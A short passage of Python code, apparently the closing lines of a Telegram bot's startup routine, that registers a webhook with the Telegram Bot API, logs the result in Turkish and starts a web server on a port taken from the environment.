        requests.get(f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={webhook_url}")
        logger.info(f"Webhook başarıyla tanımlandı: {webhook_url}")
    except Exception as e:
        logger.error(f"Webhook ayarlanamadı: {e}")

    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)), debug=False)
